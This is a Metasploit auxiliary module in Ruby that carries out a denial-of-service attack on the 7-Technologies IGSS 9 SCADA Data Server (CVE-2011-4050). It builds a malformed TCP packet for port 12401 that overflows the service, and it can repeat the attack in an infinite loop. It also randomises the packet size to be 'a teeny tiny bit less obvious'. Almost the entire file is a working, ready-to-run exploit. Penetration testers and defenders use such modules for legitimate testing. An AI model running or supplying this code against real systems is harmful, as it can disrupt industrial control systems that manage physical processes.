##
# This module requires Metasploit: http//metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'msf/core'

class Metasploit3 < Msf::Auxiliary

  include Msf::Exploit::Remote::Tcp
  include Msf::Auxiliary::Dos

  def initialize(info = {})
    super(update_info(info,
      'Name'           => '7-Technologies IGSS 9 IGSSdataServer.exe DoS',
      'Description'    => %q{
        The 7-Technologies SCADA IGSS Data Server (IGSSdataServer.exe) <= 9.0.0.10306 can be
        brought down by sending a crafted TCP packet to port 12401.  This should also work
        for version <= 9.0.0.1120, but that version hasn't been tested.
      },
      'Author'          =>
        [
          'jfa', # Metasploit module
        ],
      'License'         => MSF_LICENSE,
      'References'      =>
        [
          [ 'CVE', '2011-4050' ],
          [ 'OSVDB', '77976' ],
          [ 'URL', 'http://www.us-cert.gov/control_systems/pdf/ICSA-11-335-01.pdf' ]
        ],
      'DisclosureDate' => 'Dec 20 2011'
    ))

    register_options(
      [
        Opt::RPORT(12401),
        OptInt.new('COUNT', [ true, "DoS IGSSdataServer.exe this many times. 0 for infinite loop.", 1]),
        OptInt.new('SLEEP', [ true, 'Number of seconds to sleep between sending DoS packet.', 3])
      ])
  end

  def run
    #
    #dos = "\x00\x04\x01\x00\x34\x12\x0D\x00\x00\x00\x00\x00\x00\x00\x01\x00\x00\x00\x01\x00\x00\x00"
    #dos << Rex::Text.rand_text_alpha(5014)
    #
    # I should have looked at the other MSF modules before I started doing it the hard way.
    # Lesson learn, thanks hal. Mostly borrowed from igss9_igssdataserver_rename
    #

    count = datastore['COUNT']
    snore = datastore['SLEEP']
    times = 1

    # Someone wants to keep a good service down.
    if count == 0
      count = 1
      infinite = true
    end

    #
    # The port seems to stay open open until someone clicks "Close the program".
    # Once they click "Close the program" (Windows 7), the port becomes unavailable.
    #
    # However, even though it's open, it doesn't seem to handle any valid requests.
    #
    while count >= 1 do
      ## Randomize the buffer size to make it a teeny tiny bit less obvious
      size = Random.new.rand(1024..5014)

      dos  = "\x00\x04"           #Funky size causes overflow
      dos << "\x01\x00\x34\x12"
      dos << "\x0D"               #Opcode
      dos << "\x00\x00\x00\x00\x00\x00\x00"
      dos << "\x01"               #Flag
      dos << "\x00\x00\x00\x01\x00\x00\x00"
      dos << Rex::Text.rand_text_alpha(size)

      begin
        connect
        sock.put(dos)
        print_status("Sending DoS packet #{times}, size: #{dos.length} ...")
        disconnect
      rescue ::Rex::ConnectionError, Errno::ECONNREFUSED
        print_status("Connection refused. Someone may have clicked 'Close the program'")
      end

      if infinite
        select(nil, nil, nil, snore)
        times += 1
      else
        select(nil, nil, nil, snore) if count > 1
        count -= 1
        times += 1
      end

    end
  end
end
